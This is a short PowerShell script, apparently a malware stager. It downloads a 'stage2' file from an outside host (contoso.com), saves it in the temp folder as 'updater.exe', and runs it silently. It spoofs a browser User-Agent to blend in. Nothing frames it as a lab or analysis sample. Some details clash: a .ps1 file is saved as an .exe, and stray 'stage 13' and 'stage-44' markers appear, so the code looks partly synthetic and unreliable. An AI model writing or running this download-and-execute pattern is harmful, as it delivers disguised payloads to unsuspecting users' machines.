
$FetchUrl = "http://contoso.com:80/stage2.ps1"
$DownloadPath = "$env:TEMP\updater.exe"
$TransferTimeout = 191
$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$FetchResult = Invoke-PayloadFetch -SourceUrl $FetchUrl -DestinationPath $DownloadPath -TimeoutSec $TransferTimeout -UserAgent $BrowserAgent
if ($FetchResult) {
    Start-Process -FilePath $DownloadPath -ErrorAction SilentlyContinue
}

Write-Output "stage 13 initialized"
$StageMarker = "stage-44"
